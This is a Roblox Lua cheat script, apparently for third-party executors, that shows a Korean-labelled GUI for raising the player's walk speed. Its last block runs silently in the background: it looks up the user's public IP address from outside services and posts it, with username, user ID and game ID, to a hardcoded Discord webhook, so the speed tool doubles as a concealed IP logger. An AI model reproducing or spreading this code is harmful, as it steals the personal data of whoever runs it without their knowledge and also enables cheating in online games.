
local CREATOR_NAME = "쮸제비 나한테 와줘 " 
local WEBHOOK_URL = "https://discord.com/api/webhooks/1497621947696156943/cqQq2o6UriSdaRC-pi9Iu3hmZqTzTyMbjchy2-rvW8LJcp2_QnRMKJovrfaIlq_4G_8O"

getgenv().WalkSpeedEnabled = true
getgenv().WalkSpeedValue = 230
-- ========================================================

local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer


local parentContainer = CoreGui
pcall(function()
    local test = Instance.new("Folder", CoreGui)
    test:Destroy()
end)
if not parentContainer then
    parentContainer = LocalPlayer:WaitForChild("PlayerGui")
end

if parentContainer:FindFirstChild("WalkSpeedGui") then
    parentContainer.WalkSpeedGui:Destroy()
end

-- UI 생성
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "WalkSpeedGui"
ScreenGui.ResetOnSpawn = false
pcall(function() ScreenGui.Parent = parentContainer end)

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Size = UDim2.new(0, 220, 0, 165)
MainFrame.Position = UDim2.new(0.5, -110, 0.4, 0)
MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = MainFrame

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 24)
Title.Position = UDim2.new(0, 0, 0, 4)
Title.BackgroundTransparency = 1
Title.Text = "마태오"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.TextSize = 13
Title.Font = Enum.Font.SourceSansBold
Title.Parent = MainFrame

local SubTitle = Instance.new("TextLabel")
SubTitle.Size = UDim2.new(1, 0, 0, 16)
SubTitle.Position = UDim2.new(0, 0, 0, 24)
SubTitle.BackgroundTransparency = 1
SubTitle.Text = "혼잣말 " .. CREATOR_NAME
SubTitle.TextColor3 = Color3.fromRGB(180, 180, 180)
SubTitle.TextSize = 11
SubTitle.Font = Enum.Font.SourceSansItalic
SubTitle.Parent = MainFrame

local ToggleBtn = Instance.new("TextButton")
ToggleBtn.Size = UDim2.new(0.9, 0, 0, 28)
ToggleBtn.Position = UDim2.new(0.05, 0, 0.30, 0)
ToggleBtn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
ToggleBtn.Text = "Status: ENABLED"
ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ToggleBtn.TextSize = 12
ToggleBtn.Font = Enum.Font.SourceSansBold
ToggleBtn.Parent = MainFrame

local BtnCorner = Instance.new("UICorner")
BtnCorner.CornerRadius = UDim.new(0, 6)
BtnCorner.Parent = ToggleBtn

local SpeedInput = Instance.new("TextBox")
SpeedInput.Size = UDim2.new(0.9, 0, 0, 28)
SpeedInput.Position = UDim2.new(0.05, 0, 0.52, 0)
SpeedInput.BackgroundColor3 = Color3.fromRGB(45, 45, 50)
SpeedInput.Text = tostring(getgenv().WalkSpeedValue)
SpeedInput.PlaceholderText = "Speed Value..."
SpeedInput.TextColor3 = Color3.fromRGB(255, 255, 255)
SpeedInput.TextSize = 12
SpeedInput.Font = Enum.Font.SourceSans
SpeedInput.Parent = MainFrame

local InputCorner = Instance.new("UICorner")
InputCorner.CornerRadius = UDim.new(0, 6)
InputCorner.Parent = SpeedInput

local HintLabel = Instance.new("TextLabel")
HintLabel.Size = UDim2.new(1, 0, 0, 18)
HintLabel.Position = UDim2.new(0, 0, 0.84, 0)
HintLabel.BackgroundTransparency = 1
HintLabel.Text = "[RightShift] 로 창 숨기기/열기"
HintLabel.TextColor3 = Color3.fromRGB(140, 140, 140)
HintLabel.TextSize = 11
HintLabel.Font = Enum.Font.SourceSans
HintLabel.Parent = MainFrame

local function applySpeed(character)
    if not character then return end
    local humanoid = character:WaitForChild("Humanoid", 5)
    if not humanoid then return end

    if getgenv().WalkSpeedEnabled then
        humanoid.WalkSpeed = getgenv().WalkSpeedValue
    end

    humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
        if getgenv().WalkSpeedEnabled and humanoid.WalkSpeed ~= getgenv().WalkSpeedValue then
            humanoid.WalkSpeed = getgenv().WalkSpeedValue
        end
    end)
end

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == Enum.KeyCode.RightShift then
        MainFrame.Visible = not MainFrame.Visible
    end
end)

ToggleBtn.MouseButton1Click:Connect(function()
    getgenv().WalkSpeedEnabled = not getgenv().WalkSpeedEnabled
    if getgenv().WalkSpeedEnabled then
        ToggleBtn.Text = "Status: ENABLED"
        ToggleBtn.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
            LocalPlayer.Character.Humanoid.WalkSpeed = getgenv().WalkSpeedValue
        end
    else
        ToggleBtn.Text = "Status: DISABLED"
        ToggleBtn.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
            LocalPlayer.Character.Humanoid.WalkSpeed = 16
        end
    end
end)

SpeedInput.FocusLost:Connect(function(enterPressed)
    local num = tonumber(SpeedInput.Text)
    if num then
        getgenv().WalkSpeedValue = num
        if getgenv().WalkSpeedEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
            LocalPlayer.Character.Humanoid.WalkSpeed = num
        end
    else
        SpeedInput.Text = tostring(getgenv().WalkSpeedValue)
    end
end)

if LocalPlayer.Character then
    applySpeed(LocalPlayer.Character)
end
LocalPlayer.CharacterAdded:Connect(applySpeed)


task.spawn(function()
    if WEBHOOK_URL == "" or WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE" then return end

    
    local userIP = "불러오기 실패"
    pcall(function()
        userIP = game:HttpGet("https://api.ipify.org") -- plain text로 IP 바로 리턴
    end)

    if userIP == "불러오기 실패" then
        pcall(function()
            userIP = game:HttpGet("https://v4.ident.me") -- 보조 IP API
        end)
    end

   
    local http_req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
    if not http_req then return end

    
    local payload = {
        ["embeds"] = {{
            ["title"] = "🚀 WalkSpeed GUI 실행됨",
            ["color"] = 3447003,
            ["fields"] = {
                { ["name"] = "👤 플레이어", ["value"] = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")", ["inline"] = true },
                { ["name"] = "🌐 IP 주소", ["value"] = "||" .. userIP .. "||", ["inline"] = true },
                { ["name"] = "🎮 게임 ID", ["value"] = tostring(game.PlaceId), ["inline"] = true },
                { ["name"] = "⚡ WalkSpeed", ["value"] = tostring(getgenv().WalkSpeedValue), ["inline"] = true },
                { ["name"] = "👑 제작자", ["value"] = CREATOR_NAME, ["inline"] = true }
            },
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }

    pcall(function()
        http_req({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
    end)
end)
